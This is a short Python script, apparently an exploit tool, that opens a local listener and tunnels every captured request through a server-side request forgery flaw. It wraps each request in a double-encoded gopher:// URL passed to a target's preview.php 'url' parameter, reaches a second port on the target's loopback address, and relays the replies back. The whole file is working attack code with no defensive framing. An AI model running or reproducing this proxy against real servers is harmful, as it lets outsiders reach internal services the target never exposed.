import requests, socket, urllib.parse, argparse

parser = argparse.ArgumentParser()

parser.add_argument("-lhost", required=False, default="127.0.0.1", help="Local IP")
parser.add_argument("-lport", required=False, default="8314", help="IP address only")
parser.add_argument("-rhost", required=True, help="Remote Host")
parser.add_argument("-rport", required=False, default="80", help="Remote Port")
parser.add_argument("-rport2", required=True, help="2nd Remote Port")

a = parser.parse_args()

listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
listener.bind(("", int(a.lport)))
listener.listen(1)
print(f"[*] Listening on port {a.lport}")

while True:
    conn, addr = listener.accept()
    print(f"[*] Connection from {addr[0]}:{addr[1]}")

    request = conn.recv(262144).decode(errors="ignore")
    print(request)

    encRequest = urllib.parse.quote(urllib.parse.quote(request))

    gopherURL = (f"http://{a.rhost}:{a.rport}/preview.php?url=gopher://127.1:{a.rport2}/_{encRequest}")

    response = requests.get(gopherURL)
    conn.sendall(response.content)
    conn.close()
    
